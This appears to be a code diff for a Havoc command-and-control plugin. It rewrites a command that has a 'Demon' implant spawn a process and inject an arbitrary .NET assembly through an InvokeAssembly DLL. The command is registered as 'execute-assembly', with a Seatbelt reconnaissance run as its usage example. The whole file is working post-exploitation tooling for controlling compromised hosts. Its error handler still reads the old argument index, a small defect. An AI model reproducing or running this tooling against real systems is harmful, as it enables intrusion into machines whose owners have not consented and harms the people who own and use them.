@@ -1,6 +1,6 @@
-
-from havoc import Demon, RegisterCommand
 from struct import pack, calcsize
+from havoc import Demon, RegisterCommand
+
 
 class Packer:
     def __init__(self):
@@ -8,15 +8,7 @@ class Packer:
         self.size   : int   = 0
 
     def getbuffer(self):
-        return pack("<L", self.size) + self.buffer
-
-    def addshort(self, short):
-        self.buffer += pack("<h", short)
-        self.size += 2
-
-    def addint(self, dint):
-        self.buffer += pack("<i", dint)
-        self.size += 4
+        return pack('<L', self.size) + self.buffer
 
     def addstr(self, s):
         if isinstance(s, str):
@@ -25,51 +17,49 @@ class Packer:
         self.buffer += pack(fmt, len(s)+1, s)
         self.size += calcsize(fmt)
 
-    def addBytes(self, s, b): 
-        fmt = "<L{}s".format(s)
-        self.buffer += pack(fmt, s, str(b))
-        self.size += calcsize(fmt)
 
-    def addWstr(self, s):
-        s = s.encode("utf-16_le")
-        fmt = "<L{}s".format(len(s) + 2)
-        self.buffer += pack(fmt, len(s)+2, s)
-        self.size += calcsize(fmt)
-
-def InvokeAssembly( demonID, *param ):
-    TaskID   : str    = None
+def InvokeAssembly(demonID, *param):
+    taskID   : str    = None
     demon    : Demon  = None
-    Assembly : str    = None
     packer   = Packer()
 
-    demon  = Demon( demonID )
+    demon = Demon(demonID)
 
     if demon.ProcessArch == 'x86':
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
+        demon.ConsoleWrite(demon.CONSOLE_ERROR, 'x86 is not supported')
         return False
 
-    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon spawn and inject an assembly executable" )
+    taskID = demon.ConsoleWrite(demon.CONSOLE_TASK, 'Tasked demon spawn and inject an assembly executable')
     
-    if len( param ) < 2:
-        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
+    if len(param) == 0:
+        demon.ConsoleWrite(demon.CONSOLE_ERROR, 'Not enough arguments')
         return
 
     try:
-        Assembly = open( param[ 1 ], 'rb' )
+        packer.addstr('DefaultAppDomain')
+        packer.addstr('v4.0.30319')
+        packer.addstr(open(param[0], 'rb').read())
 
-        packer.addstr( "DefaultAppDomain" )
-        packer.addstr( "v4.0.30319" )
-        packer.addstr( str(Assembly.read()) )
-        packer.addstr( " " + ''.join( param[ 2: ] ) )
+        args = ' '
+        if len(param) > 1:
+            args += ' '.join(param[1:])
+        
+        packer.addstr(args)
 
     except OSError:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Failed to open assembly file: " + param[ 1 ] )
+        demon.ConsoleWrite(demon.CONSOLE_ERROR, f'Failed to open assembly file: {param[1]}')
         return
 
-    arg = packer.getbuffer() 
+    demon.DllSpawn(taskID, f'bin/InvokeAssembly.{demon.ProcessArch}.dll', packer.getbuffer())
 
-    demon.DllSpawn( TaskID, f"bin/InvokeAssembly.{demon.ProcessArch}.dll", arg )
+    return taskID
 
-    return TaskID
 
-RegisterCommand( InvokeAssembly, "dotnet", "execute", "executes a dotnet assembly in a seperate process", 0, "[/path/to/assembl.exe] (args)", "/tmp/Seatbelt.exe -group=user" )
+RegisterCommand(
+    InvokeAssembly,
+    '',
+    'execute-assembly',
+    'executes a dotnet assembly in a seperate process',
+    0,
+    '[/path/to/assembl.exe] (args)', '/tmp/Seatbelt.exe -group=user'
+)
